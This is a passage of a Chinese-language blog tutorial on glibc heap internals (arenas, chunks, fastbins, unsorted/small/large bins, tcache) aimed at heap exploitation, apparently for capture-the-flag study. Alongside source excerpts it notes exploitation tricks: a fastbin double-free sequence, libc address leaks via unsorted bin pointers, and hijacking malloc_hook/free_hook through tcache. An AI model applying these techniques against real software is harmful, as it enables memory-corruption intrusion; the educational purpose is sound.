class="hljs-comment">//指向last_remainder</span><br><br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<span class="hljs-comment">//存放除fastbin的所有bin</span><br><br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><span class="hljs-comment">//指向下一个arena</span><br><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><span class="hljs-comment">//指向下一个空闲的arena</span><br><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<span class="hljs-comment">//使用本arena的线程的数量</span><br><br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  <span class="hljs-comment">//分配给本arena的内存范围</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="2-heap-info"><a href="#2-heap-info" class="headerlink" title="2._heap_info"></a>2._heap_info</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>  mstate ar_ptr; <span class="hljs-comment">/* Arena for this heap. */</span>此堆段属于哪一个arena<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span> <span class="hljs-comment">/* Previous heap. */</span>指向前一个heap，非主线程的heap通过这个连接起来，串成单向链表<br>  <span class="hljs-type">size_t</span> size;   <span class="hljs-comment">/* Current size in bytes. */</span><br>  <span class="hljs-type">size_t</span> mprotect_size; <span class="hljs-comment">/* Size in bytes that has been mprotected</span><br><span class="hljs-comment">                           PROT_READ|PROT_WRITE.  */</span><br>  <span class="hljs-comment">/* Make sure the following data is properly aligned, particularly</span><br><span class="hljs-comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span><br><span class="hljs-comment">     MALLOC_ALIGNMENT. */</span><br>  <span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];<br>&#125; heap_info;<br></code></pre></td></tr></table></figure><p>main_arena没有_heap_info，其存在于thread_arena的每个heap的低地址开头，用于解释说明该heap。</p><h2 id="3-chunk和malloc-chunk"><a href="#3-chunk和malloc-chunk" class="headerlink" title="3.chunk和malloc_chunk"></a>3.chunk和malloc_chunk</h2><p>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。</p><p><strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong>。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  This struct declaration is misleading (but accurate and necessary).</span><br><span class="hljs-comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span><br><span class="hljs-comment">  fields at known offsets from a given base. See explanation below.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/image-20230215163401495.png" alt="image-20230215163401495"></p><p>在内存中，prev_size在低地址，bk_nextsize在高地址</p><p>一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。</p><p>每个字段的具体的解释如下</p><ul><li><strong>prev_size</strong>, 如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。</li><li>size，该 chunk 的大小(包括了chunk_header,即prev_size和size)，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li><li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li>fd，bk。chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<ul><li>fd 指向下一个（非物理相邻）空闲的 chunk</li><li>bk 指向上一个（非物理相邻）空闲的 chunk</li><li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li><li>fd和bk指向的是prev_size位，是chunk_header,不是usr_data,所以p-&gt;fd-&gt;fd 即 p-&gt;fd - 0x18指向的地址单元内的数据(x64 )</li><li>但是，malloc函数返回的指针是指向usr_data的指针，free的也是这个指针</li></ul></li><li>fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li></ul></li></ul><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/image-20230215160404418.png" alt="image-20230215160404418"></p><p>如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小</p><ol><li>本身的 size 字段会记录，</li><li>它后面的 chunk 会记录。</li></ol><p><strong>一般情况下</strong>，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。同时，如果被free的chunk上方是top chunk,则该chunk会和top chunk合并。</p><h2 id="4-fastbinsY"><a href="#4-fastbinsY" class="headerlink" title="4.fastbinsY"></a>4.fastbinsY</h2><p>fastbin有10个数组(bin)，每个数组存放一个单向链表，每个链表存放同一个size的chunk，在进行添加删除操作时使用的是LIFO原则</p><p>题外话：为什么使用LIFO？为什么不直接插在链表尾？因为glibc有的只是fastbins[n]这一个指针和被free的chunk的地址，如果要插到链表尾，则需要沿着链表头一直迭代到链表尾，耗时更长</p><p>fastbin是为了减少小内存的切割和合并，提高效率而存在的。<strong>fastbin 范围的 chunk 的 inuse 始终被置为 1。因此它们不会和其它被释放的 chunk 合并。</strong>但是当释放的 chunk 与该 chunk 相邻的空闲 chunk 合并后的大小大于 FASTBIN_CONSOLIDATION_THRESHOLD 时，内存碎片可能比较多了，我们就需要把 fast bins 中的 chunk 都进行合并，以减少内存碎片对系统的影响。malloc_consolidate 函数可以将 fastbin 中所有能和其它 chunk 合并的 chunk 合并在一起。</p><p>默认情况下，对于size_t为4B的平台， 小于64B的chunk分配请求（最大可以80B，默认56B，即<strong>默认用8个bin</strong>）；对于size_t为8B的平台，小于128B的chunk分配请求(最大可以160B，默认112B)，程序会根据所需的size(<strong>这里指的是数据空间的大小，即去除prev_size和size字段后的大小</strong>)首先到fastbin中去寻找对应大小的bin中是否包含未被使用的chunk，如果有，则直接从bin中返回该chunk。而释放chunk时，也会根据chunk的size参数计算fastbin中对应的index，如果存在对应的大小，就将chunk直接插入对应的bin中。</p><p>tips：<em>32位平台 size_t 长度为 4 字节，64 位平台的 size_t 长度可能是 4 字节，也可能是 8 字节，64 位Linux平台 size_t 长度为 8 字节</em></p><p>32位下，各个fastbin存储的大小为:8,16,24,32,40,48,56,64,72,80</p><p>64位下，各个fastbin存储的大小为:16,32,48,64,80,96,112,128,144,160</p><p>例子：</p><p>在bin中插入chunk时，首先将要插入的chunk的fd修改为此时bin数组中存放的指针值，再将bin数组指向要插入的chunk，我们将bin数组指向的chunk称为链表头，每次插入chunk都插入到链表头，取出chunk也是先从链表头取</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">buff0</span> <span class="hljs-operator">=</span> malloc（malloc_size)<br><span class="hljs-attribute">buff1</span> <span class="hljs-operator">=</span> malloc（malloc_size)<br><span class="hljs-attribute">buff2</span> <span class="hljs-operator">=</span> malloc（malloc_size)<br>free（buff0）<br>free（buff1）<br>free（buff2）<br></code></pre></td></tr></table></figure><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/8854824-a442c2d04218da5f.webp" alt="8854824-a442c2d04218da5f"></p><p>1.malloc申请fastbin范围内的chunk时，会首先在fastbins中查询对应size的链表头是否为空，若不为空，则继续<strong>检查链表头指向的chunk的size位</strong>，没问题则返回给用户。在利用double free时需要特别注意这一点，最后申请到的目标地址并不是任意的，而是需要一个伪造的chunk。顺带一提，fd指向的是chunk_header的首地址，不是usr_data的首地址。</p><p>2.由于fastbin的机制，在满足fastbin的chunk在被释放后它下一个chunk的P位不会被置为0，也就是说即使当前chunk被释放掉了，但是他的next_chunk的P为还依然为1，导致了chunk能被多次释放，这样做是为了防止chunk被合并，提高效率，但成为了造成double free漏洞的因素之一。</p><p>3.对于fastbin中的chunk，在释放时只会对链表头的chunk进行检验</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Another simple check: make sure the top of the bin is not the</span><br><span class="hljs-comment">       record we are going to add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure><p>如上，释放chunk时会检测该chunk是否是链表头指向的chunk，是则报错</p><p>但是我们可以先free(chunk1)，再free(chunk2),再free(chunk1),这样chunk1就被free了两次，造成了double free漏洞</p><p>针对fastbin的攻击有：</p><ul><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><h2 id="5-bins"><a href="#5-bins" class="headerlink" title="5.bins"></a>5.bins</h2><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/image-20230215210936982.png" alt="image-20230215210936982"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<span class="hljs-comment">//NBINS = 128，即bins[254]</span><br></code></pre></td></tr></table></figure><ul><li><p>用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。</p></li><li><p>malloc_state结构体的成员，每两个bins控制一个双向循环链表，第一个bins为fd，指向链表的头结点，第二个bins为bk，指向链表的尾结点，为了方便起见在这里称两个bins为一个BINS，这里一共有127个BINS。</p></li></ul><p><strong>对于bins中的双向链表，当BIN中只有一个chunk时，fd和bk指针都指向链表头，即一个libc的地址，可以用来泄露libc地址。并且由于chunk在大于fast bin时优先进入unsorted bin，进入small bin和large bin的条件较为苛刻，一般是用unsorted bin，其链表头地址为main_arena+88。比较典型的利用可以参考buu babyheap_0ctf_2017</strong></p><h3 id="1-unsorted-bin"><a href="#1-unsorted-bin" class="headerlink" title="1.unsorted bin"></a>1.unsorted bin</h3><h3 id="BINS-0-（即bins-0-bins-1-）为unsorted-bin，占一个BINS"><a href="#BINS-0-（即bins-0-bins-1-）为unsorted-bin，占一个BINS" class="headerlink" title="BINS[0]（即bins[0],bins[1]）为unsorted bin，占一个BINS"></a>BINS[0]（即bins[0],bins[1]）为unsorted bin，占一个BINS</h3><p><strong>FIFO</strong>，从头部插入，从尾部取出</p><p>&amp;bins[0]  &#x3D; main_arena + 104        &amp;bins[1] &#x3D; main_arena + 112</p><p>无chunk时，bins[0] &#x3D; bins[1] &#x3D; main_arena + 88  </p><p>只有一个chunk时，bins[0]和bins[1]都指向该chunk，该chunk的fd和bk都指向main_arena+88,该地址处存放top_chunk的地址</p><p>有多个chunk时，尾部的chunk的fd指向main_arena + 0x88</p><p>题外话：如果把bins[0]看作一个chunk的fd，bins[1]看作bk，那么main_arena+88就是这个chunk的prev_size</p><h3 id="2-small-bin"><a href="#2-small-bin" class="headerlink" title="2.small bin"></a>2.small bin</h3><h3 id="BINS-2-BINS-63-（即bins-2-bins-125-）为small-bins，占62个BINS"><a href="#BINS-2-BINS-63-（即bins-2-bins-125-）为small-bins，占62个BINS" class="headerlink" title="BINS[2]-BINS[63]（即bins[2]-bins[125]）为small bins，占62个BINS"></a>BINS[2]-BINS[63]（即bins[2]-bins[125]）为small bins，占62个BINS</h3><p>​链表中chunk的大小与index的关系是<em><em>2</em> size_t</em> index**</p><p>​采用<strong>FIFO(先入先出)算法</strong>：内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的   rear end(尾端)中获取chunk。</p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/201907300808254.png" alt="201907300808254"></p><h3 id="3-large-bin"><a href="#3-large-bin" class="headerlink" title="3.large bin"></a>3.large bin</h3><h3 id="BINS-64-BINS-126-（即bins-126-bins-251-）为large-bins，占63个BINS"><a href="#BINS-64-BINS-126-（即bins-126-bins-251-）为large-bins，占63个BINS" class="headerlink" title="BINS[64]-BINS[126]（即bins[126]-bins[251]）为large bins，占63个BINS"></a>BINS[64]-BINS[126]（即bins[126]-bins[251]）为large bins，占63个BINS</h3><p>​大于等于1024字节（0x400）的chunk称之为large chunk</p><ul><li><p>large bin链表的个数为63个，被分为6组。</p></li><li><p>largechunk使用fd_nextsize、bk_nextsize连接起来。</p></li><li><p>同一个largebin中每个chunk的大小可以不一样，这些chunk根据一定的范围存储在一个larbin链表中。</p></li><li><p>large chunk可以添加、删除在large bin的任何一个位置。</p></li><li><p>在这63个largebins中：第一组的32个largebin链依次以64字节步长为间隔，即第一个largebin链中chunksize为1024-1087字节，第二个large bin中chunk size为1088~1151字节。第二组的16个largebin链依次以512字节步长为间隔；第三组的8个largebin链以步长4096为间隔；第四组的4个largebin链以32768字节为间隔；第五组的2个largebin链以262144字节为间隔；最后一组的largebin链中的chunk大小无限制。</p></li><li><p>在同一个largebin中：每个chunk的大小不一定相同，因此为了加快内存分配和释放的速度，就将同一个largebin中的所有chunk按照chunksize进行从大到小的排列：最大的chunk放在一个链表的front end，最小的chunk放在rear end；相同大小的chunk按照最近使用顺序排序。</p></li></ul><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/20190730154304263.png" alt="20190730154304263"></p><h2 id="6-堆内存释放"><a href="#6-堆内存释放" class="headerlink" title="6.堆内存释放"></a>6.堆内存释放</h2><p>主要流程在_int_free</p><p><a href="https://www.52pojie.cn/thread-1581911-1-1.html">glibcmalloc和free源码解析</a></p><p>（1）根据可用地址获取该地址所在的内存块</p><p> (1.5)各种check，如传入的指向chunk的指针是否16字节对齐(32位下8字节)，size位不能小于MINSIZE，下一个chunk的prev_inuse需要为1</p><p>（2）检查该内存块的大小是否属于 fast chunk范围，若是，则直接放入fast bin；否则（3）<br>（3）检查该内存块标志位M，若为1，则直接使用munmap释放；否则（4）<br>（4）检查相邻的上一个内存块（低地址）是否空闲，若空闲，则合并；<br>（5）检查相邻的下一个内存块是否空闲，若非空闲，则直接加入unsorted bin；若空闲，检查该内存块是否为top chunk，若为top chunk，则合并并修改top chunk的地址和大小；若非top chunk，则合并并添加到unsorted bin<br>（6）对于主Arena，检查top chunk的区域是否超过设定的阈值，若超过，那么就适当地缩减一部分，通过brk将一部分内存还给内核；对于子Arena，则会检查，目前top chunk所在堆的内存是否已经全部释放，若已将全部释放，那就通过munmap将这片内存还给内核。</p><p>可以看出，free内存块一共有4个去向：①放入fast bins ②放入unsorted bin ③合并入top chunk ④直接通过unmap还给内核</p><p>注：主Arena在进行堆的缩减时，首先通过sbrk(0)获取当前的brk的边界，如果brk &#x3D; top起始地址 + top的大小 才会进行缩减，这说明，当top chunk存在于mmap得到的堆时，brk还停留在非mmap得到的堆顶，这就是arena部分所说的这部分内存将永远无法返还给内核的原因。</p><p>堆合并一般思路： </p><p>1.尝试向低地址合并。</p><p>2.尝试向高地址合并，若为topchunk则直接并入topchunk，否则尝试合并后放入unsorted bin</p><h2 id="7-堆内存分配"><a href="#7-堆内存分配" class="headerlink" title="7.堆内存分配"></a>7.堆内存分配</h2><p>主要流程在_int_malloc</p><p><a href="https://www.52pojie.cn/thread-1581911-1-1.html">glibcmalloc和free源码解析</a></p><p><strong>请求的字节数和实际分配的内存大小原则</strong>：</p><p>1.不管是32位还是64位，malloc申请的内存(usr_data+chunk头)都是16字节对齐的</p><p>2.会对下一个chunk的prev_size位进行复用，比如32位下malloc(0x2c),按理来说0x2c+8位chunk头 &gt; 0x30，则chunk_size为0x41，但是由于复用了，chunk_size还是0x31，而malloc(0x2d)，chunk_size就是0x41了</p><p>  所以32位下，glibc2.31（ubuntu1804默认）、2.27,chunk_size &#x3D; malloc_size + 8 - 4     16位向上对齐（即不足16位按16位算）</p><p>  32位下对于   glibc2.23（ubuntu1604默认），chunk_size &#x3D; malloc_size + 8 - 4             8位向上对齐</p><p>  64位下chunk_size &#x3D; malloc_size + 0x10 - 8      16位向上对齐</p><p>  glib中堆内存分配的基本思路就是，首先找到本线程的Arena，然后优先在Arena对应的回收箱中寻找合适大小的内存，在内存箱中所有内存块均小于所需求的大小，那么就会去top chunk分割，但是如果top chunk的大小也不足够，此时不一定要拓展top，检查所需的内存是否大于128k，若大于，则直接使用系统调用mmap分配内存，如果小于，就进行top chunk的拓展，即堆的拓展，拓展完成后，从top chunk中分配内存，剩余部分成为新的top chunk。</p><pre><code class="hljs">1. 检查是否设置了`malloc_hook`，若设置了则跳转进入`malloc_hook`，若未设置则获取当前的分配区，进入`int_malloc`函数。2. 如果当前的分配区为空，则调用`sysmalloc`分配空间，返回指向新`chunk`的指针，否则进入下一步。3. 若用户申请的大小在`fast bin`的范围内，则考虑寻找对应`size`的`fast bin chunk`，判断该`size`的`fast bin`是否为空，不为空则取出第一个`chunk`返回，否则进入下一步。4. 如果用户申请的大小符合`small bin`的范围，则在相应大小的链表中寻找`chunk`，若`small bin`未初始化，则调用`malloc_consolidate`初始化分配器，然后继续下面的步骤，否则寻找对应的`small bin`的链表，如果该`size` 的`small bin`不为空则取出返回，否则继续下面的步骤。如果申请的不在`small bin`的范围那么调用`malloc_consolidate`去合并所有`fast bin`并继续下面的步骤。5. 用户申请的大小符合`large bin`或`small bin`链表为空，开始处理`unsorted bin`链表中的`chunk`。在`unsorted bin`链表中查找符合大小的`chunk`，若用户申请的大小为`small bin`，`unsorted bin`中只有一块chunk并指向`last_remainder`，且`chunk size`的大小大于`size+MINSIZE`，则对当前的`chunk`进行分割，更新分配器中的`last_remainder`，切出的`chunk`返回给用户，剩余的`chunk`回`unsorted bin`。否则进入下一步。6. 将当前的`unsorted bin`中的`chunk`取下，若其`size`恰好为用户申请的`size`，则将`chunk`返回给用户。否则进入下一步7. 获取当前`chunk size`所对应的bins数组中的头指针。（`large bin`需要保证从大到小的顺序，因此需要遍历）将其插入到对应的链表中。如果处理的chunk的数量大于`MAX_ITERS`则不在处理。进入下一步。8. 如果用户申请的空间的大小符合`large bin`的范围或者对应的small bin链表为空且`unsorted bin`链表中没有符合大小的`chunk`，则在对应的`large bin`链表中查找符合条件的`chunk`（即其大小要大于用户申请的`size`）。若找到相应的`chunk`则对`chunk`进行拆分，返回符合要求的`chunk`（无法拆分时整块返回）。否则进入下一步。9. 根据`binmap`找到表示更大`size`的`large bin`链表，若其中存在空闲的`chunk`，则将`chunk`拆分之后返回符合要求的部分，并更新`last_remainder`。否则进入下一步。10. 若`top_chunk`的大小大于用户申请的空间的大小，则将`top_chunk`拆分，返回符合用户要求的`chunk`，并更新`last_remainder`，否则进入下一步。11. 若`fast bin`不为空，则调用`malloc_consolidate`合并`fast bin`，重新回到第四步再次从`small bin`搜索。否则进入下一步。12. 调用`sysmalloc`分配空间，`free top chunk`返回指向新`chunk`的指针。13. 若`_int_malloc`函数返回的`chunk`指针为空，且当前分配区指针不为空，则再次尝试`_int_malloc`14. 对`chunk`指针进行检查，主要检查`chunk`是否为`mmap`，且位于当前的分配区内。</code></pre><p>  注：<br>  ①small request是指实际分配的内存块大小属于small chunk范围<br>  ②fast bins合并操作是指，检查fast bins中的所有内存块是否可以和相邻内存块合并，若可以合并，则进行合并，并将合并后的内存块加入到unsorted bin中<br>  ③last remainder是一个目的为更好的利用空间局部性的优化！<br>  ④MINSIZE是指一个内存块的最小大小，即 chunk头的前两个字段所占空间<br>  ⑤遍历unsorted bin 是，并不是找到一个大于当前所需的内存块就返回，是因为遵循“small first，best fit”原则，因为可能存在内存更小，内存块用于分配<br>  ⑥找到合适的内存块后，会将内存块从当前链表中移除<br>  ⑦large chunk是否可以分割取决于剩余的大小是否大于MINSIZE<br>  ⑧binmap是一个用于记录bins中各个bin是否存在有内存块的位图，需要注意，位图中若为空，则表示一定不存在；若非空，则可能存在；<br>  ⑨注意到，内存块的分配是按照对齐来的，并且内存块的分割若不成功，则会返回整个内存块，也就是说，我们得到的内存大小实际上可能大于我们所需要的内存大小的。<br>  ⑩直接使用mmap申请的内存会被标记为M，释放时，也会直接走munp释放给内核</p><h2 id="8-tcache-bin"><a href="#8-tcache-bin" class="headerlink" title="8.tcache bin"></a>8.tcache bin</h2><p>全称thread local caching，glibc 2.26开始引入 ，目的是提高效率，但是牺牲了安全性</p><ul><li><p>单链表，LIFO，后进先出，即存取都在链表头，链表指针为fd字段</p></li><li><p>和fastbin一样，不会被合并，inuse位不会置0</p></li><li><p>tcachebin中的链表指针指向的下一个chunk的<code>fd</code>字段，fastbin中的链表指针指向的是下一个chunk的<code>prev_size</code>字段</p></li><li><p>tcache_perthread_struct结构体中的tcache_entry *entries[TCACHE_MAX_BINS];声明了有64个元素的指针数组，即有64个tcache单链表，每相邻两个链表中的chunk大小相差0x10，所以用户数据部分范围(不考虑复用)是0x10-0x400，chunk_size最大0x410，malloc(&lt;&#x3D;0x408)的chunk都在tcache范围内。32位机器上是以8字节递增，即用户数据范围0x8-0x19c,chunk_size最大0x204，malloc(&lt;&#x3D;0x200)的chunk都在范围内。</p></li><li><p>每个单链表中最多存7个chunk</p></li><li><p>在<code>_int_free</code>中，最开始就先检查chunk的size是否落在了tcache的范围内，且对应的tcache未满，将其放入tcache中。</p></li><li><p>在内存申请的开始部分，调用malloc_hook之后，int_malloc之前，首先会判断申请大小块，在 tcache 是否存在，如果存在就直接从 tcache 中摘取，否则再使用_int_malloc 分配。注：这里没有对size是否符合bin对应的size的验证，可以直接劫持free_hook、malloc_hook、got表等</p><p>在<code>_int_malloc</code>中，</p><p>如果从fastbin中取出了一个块，那么会把该fastbin中剩余的块放入tcache中直至填满tcache（smallbin中也是一样）</p><p>如果进入了unsortedbin，且chunk的size和当前申请的大小精确匹配，那么在tcache未满的情况下会先将其放入到tcachebin中，继续在unsorted bin中遍历，遍历完若tcachebin中有对应大小的chunk，从tcache中取出（最后一个遍历到的chunk），如果在这个遍历的过程中，放入tcache的chunk达到tcache_unsorted_limit，则会直接返回当前遍历到的unsorted chunk。</p></li><li><p>binning code（chunk合并等其他情况）中，每一个符合要求的 chunk 都会优先被放入 tcache，而不是直接返回（除非tcache被装满）。如：合并完后的大chunk也会被先放进tcache</p></li><li><p><code>tcache_perthread_struct</code>本身也是一个堆块，大小为<code>0x250</code>，位于堆开头的位置，包含数组<code>counts</code>存放每个<code>bin</code>中的<code>chunk</code>当前数量，以及数组<code>entries</code>存放<code>64</code>个<code>bin</code>的首地址（可以通过<strong>劫持此堆块</strong>进行攻击）。</p></li><li><p>calloc()可越过tcache取chunk</p></li><li><p>可将<code>tcache_count</code>整型溢出为<code>0xff</code>以绕过<code>tcache</code>，直接放入<code>unsorted bin</code>等，但在<code>libc-2.28</code>中，检测了<code>counts</code>溢出变成负数（<code>0x00-1=0xff</code>）的情况，且增加了对<code>double free</code>的检查。</p></li></ul><p>1.<strong>glibc2.26</strong>开始引入(ubuntu17.10) ，但从glibc2.27开始引入了许多针对tcache的保护</p><p>2.27新增：</p><ul><li><code>CVE-2017-17426</code>是<code>libc-2.26</code>存在的漏洞，<code>libc-2.27</code>已经修复</li></ul><p>2.28新增：</p><ul><li>检测了<code>tcache_count</code>溢出变成负数（<code>0x00-1=0xff</code>）的情况</li><li>增加了对<code>double free</code>的检查</li></ul><p>2.29新增：</p><ul><li>在<code>tcache_put</code>和<code>tcache_get</code>中增加了对<code>key</code>的检查，chunk放入tcache后在chunk的开头加了key标识，通过检查key来判断chunk是否已经在tcache中存在，以此检查是否存在<code>double free</code></li></ul><p>2.32新增：</p><ul><li>引入safe_unlink机制，<code>tcache</code>和<code>fastbin</code>的<code>fd</code>指针<code>异或加密</code></li></ul><p>源码(glibc2.26)：</p><p>malloc和free的函数中以及其它也有和tcache相关的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 